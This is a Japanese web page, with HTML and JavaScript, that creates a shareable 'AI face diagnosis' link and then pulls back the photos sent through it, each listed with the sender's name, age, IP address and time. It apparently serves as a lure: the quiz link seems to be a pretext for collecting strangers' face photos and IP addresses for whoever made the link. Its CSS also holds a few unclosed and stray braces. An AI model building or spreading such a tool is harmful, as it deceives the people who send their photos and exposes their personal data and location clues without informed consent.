```html
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>写真受信</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  font-family: sans-serif;
  background: linear-gradient(
    135deg,
    #111827,
    #312e81,
    #581c87
  );
  color: #222;
  min-height: 100vh;
}

.container {
  max-width: 600px;
  margin: auto;
  background: white;
  padding: 25px;
  border-radius: 24px;
  box-shadow: 0 10px 40px rgba(0,0,0,0.35);
}

h1 {
  text-align: center;
  margin-top: 0;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 12px;
  border: none;
  border-radius: 12px;
  background: #111827;
  color: white;
  font-size: 16px;
  cursor: pointer;
}

button:disabled {
  background: #aaa;
}

.roomBox {
  margin-top: 20px;
  padding: 15px;
  background: #f3f4f6;
  border-radius: 14px;

.roomId {
  font-weight: bold;
  word-break: break-all;
}

.linkBox {
  margin-top: 15px;
  padding: 15px;
  background: #faf5ff;
  border-radius: 14px;
  word-break: break-all;
}

.photoList {
  margin-top: 25px;
}

.photoCard {
  margin-top: 20px;
  padding: 15px;
  background: #f5f5f7;
  border-radius: 18px;
}

.photoCard img {
  display: block;
  width: 100%;
  margin-top: 15px;
  border-radius: 14px;
}

.info {
  margin-top: 8px;

  word-break: break-word;
}

.warning {
  margin-top: 20px;
  padding: 14px;
  background: #fff7ed;
  color: #9a3412;
  border-radius: 12px;
  font-size: 13px;
  line-height: 1.6;
}

.status {
  margin-top: 15px;
  color: #555;
  white-space: pre-wrap;
}

.copyButton {
  background: #4f46e5;
}

  background: #16a34a;
}

.checkButton {
  background: linear-gradient(
    135deg,
    #4f46e5,
    #9333ea
  );
}
</style>
</head>

<body>

<div class="container">

<h1>📷 写真受信</h1>

<p>
リンクを作成して、そのリンクから送信された写真を確認できます。
</p>

<button id="createLinkButton">
🔗 リンクを作成
</button>


<div
  id="roomBox"
  class="roomBox"
  style="display:none;"
>

<strong>ルームID</strong>

<div
  id="roomId"
  class="roomId"
></div>

</div>


<div
  id="linkBox"
  class="linkBox"
  style="display:none;"
>

<strong>診断用リンク</strong>

<div
  id="diagnosisLink"
></div>

<button
  id="copyButton"
  class="copyButton"
>
📋 リンクをコピー
</button>

<button
  id="openButton"
  class="openButton"
>
🌐 診断ページを開く
</button>

</div>


<button
  id="checkButton"
  class="checkButton"
  style="display:none;"
>
📷 写真を確認
</button>


<div
  id="status"
  class="status"
></div>


<div
  id="photoList"
  class="photoList"
></div>


<div class="warning">

<strong>⚠️ データについて</strong>

<br>

このページでは、写真送信時に登録された
名前・年齢・IPアドレス・送信日時を表示します。

<br><br>

IPアドレスだけで自宅住所や本名が分かるものではありません。
写真や個人情報は必要な範囲で適切に管理してください。

</div>

</div>


<script>

const PHOTO_RECEIVER_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";


const DIAGNOSIS_URL =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


const STORAGE_KEY =
  "receiverRoom";


const createLinkButton =
  document.getElementById(
    "createLinkButton"
  );

const roomBox =
  document.getElementById(
    "roomBox"
  );

const roomId =
  document.getElementById(
    "roomId"
  );

const linkBox =
  document.getElementById(
    "linkBox"
  );

const diagnosisLink =
  document.getElementById(
    "diagnosisLink"
  );

const copyButton =
  document.getElementById(
    "copyButton"
  );

const openButton =
  document.getElementById(
    "openButton"
  );

const checkButton =
  document.getElementById(
    "checkButton"
  );

const status =
  document.getElementById(
    "status"
  );

const photoList =
  document.getElementById(
    "photoList"
  );


let currentRoom = "";


/*
========================================
ルームID生成
========================================
*/

function createRoomId() {

  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      chars[
        Math.floor(
          Math.random() *
          chars.length
        )
      ];

  }

  return result;

}


/*
========================================
HTMLエスケープ
========================================
*/

function escapeHtml(
  value
) {

  return String(value ?? "")
    .replace(
      /&/g,
      "&amp;"
    )
    .replace(
      /</g,
      "&lt;"
    )
    .replace(
      />/g,
      "&gt;"
    )
    .replace(
      /"/g,
      "&quot;"
    )
    .replace(
      /'/g,
      "&#039;"
    );

}


/*
========================================
ルーム表示
========================================
*/

function showRoom(
  room
) {

  currentRoom =
    room;

  localStorage.setItem(
    STORAGE_KEY,
    room
  );


  const link =
    DIAGNOSIS_URL +
    "?room=" +
    encodeURIComponent(
      room
    );


  roomId.textContent =
    room;


  diagnosisLink.textContent =
    link;


  roomBox.style.display =
    "block";

  linkBox.style.display =
    "block";

  checkButton.style.display =
    "block";

}


/*
========================================
リンク作成
========================================
*/

createLinkButton.addEventListener(
  "click",
  () => {

    const newRoom =
      createRoomId();

    showRoom(
      newRoom
    );


    status.textContent =
      "新しいリンクを作成しました。";

    photoList.innerHTML =
      "";

  }
);


/*
========================================
リンクコピー
========================================
*/

copyButton.addEventListener(
  "click",
  async () => {

    if (!currentRoom) {
      return;
    }


    const link =
      DIAGNOSIS_URL +
      "?room=" +
      encodeURIComponent(
        currentRoom
      );


    try {

      await navigator.clipboard.writeText(
        link
      );


      status.textContent =
        "✅ リンクをコピーしました！";

    } catch (error) {

      status.textContent =
        "リンクのコピーに失敗しました。";

    }

  }
);


/*
========================================
診断ページを開く
========================================
*/

openButton.addEventListener(
  "click",
  () => {

    if (!currentRoom) {
      return;
    }


    const link =
      DIAGNOSIS_URL +
      "?room=" +
      encodeURIComponent(
        currentRoom
      );


    window.open(
      link,
      "_blank"
    );

  }
);


/*
========================================
写真確認
========================================
*/

checkButton.addEventListener(
  "click",
  async () => {

    if (!currentRoom) {

      status.textContent =
        "先にリンクを作成してください。";

      return;

    }


    checkButton.disabled =
      true;

    checkButton.textContent =
      "📷 読み込み中...";

    status.textContent =
      "写真を確認しています...";

    photoList.innerHTML =
      "";


    try {

      const url =
        PHOTO_RECEIVER_URL +
        "?room=" +
        encodeURIComponent(
          currentRoom
        );


      const response =
        await fetch(
          url
        );


      const data =
        await response.json();


      if (!response.ok) {

        throw new Error(
          data.error ||
          "写真一覧の取得に失敗しました。"
        );

      }


      if (
        !data.success
      ) {

        throw new Error(
          data.error ||
          "写真一覧を取得できませんでした。"
        );

      }


      const photos =
        data.photos || [];


      if (
        photos.length === 0
      ) {

        photoList.innerHTML =
          `
          <div class="empty">
            📷 まだ写真はありません。
          </div>
          `;

        status.textContent =
          "写真はありません。";

        return;

      }


      photos.forEach(
        (
          photo,
          index
        ) => {

          const card =
            document.createElement(
              "div"
            );

          card.className =
            "photoCard";


          const nickname =
            escapeHtml(
              photo.nickname ||
              "名無し"
            );


          const age =
            photo.age !== null &&
            photo.age !== undefined &&
            photo.age !== ""
              ? escapeHtml(
                  photo.age
                ) + "歳"
              : "未入力";


          const ip =
            escapeHtml(
              photo.ip ||
              "記録なし"
            );


          let createdAt =
            "記録なし";


          if (
            photo.created_at
          ) {

            const date =
              new Date(
                photo.created_at
              );


            if (
              !Number.isNaN(
                date.getTime()
              )
            ) {

              createdAt =
                date.toLocaleString(
                  "ja-JP"
                );

            }

          }


          card.innerHTML =
            `
            <strong>
              📷 写真 ${index + 1}
            </strong>

            <div class="info">
              👤 ${nickname} さん
            </div>

            <div class="info">
              🎂 年齢：${age}
            </div>

            <div class="info">
              🌐 IP：${ip}
            </div>

            <div class="info">
              🕐 送信日時：${escapeHtml(
                createdAt
              )}
            </div>

            <img
              src="${escapeHtml(
                photo.url
              )}"
              alt="受信した写真"
            >
            `;


          photoList.appendChild(
            card
          );

        }
      );


      status.textContent =
        "✅ " +
        photos.length +
        "枚の写真を確認しました。";


    } catch (error) {

      console.error(
        error
      );


      status.textContent =
        "❌ エラー：\n" +
        error.message;


    } finally {

      checkButton.disabled =
        false;

      checkButton.textContent =
        "📷 写真を確認";

    }

  }
);


/*
========================================
前回のルームを復元
========================================
*/

const savedRoom =
  localStorage.getItem(
    STORAGE_KEY
  );


if (
  savedRoom
) {

  showRoom(
    savedRoom
  );

  status.textContent =
    "前回作成したリンクを復元しました。";

}

</script>

</body>
</html>
```
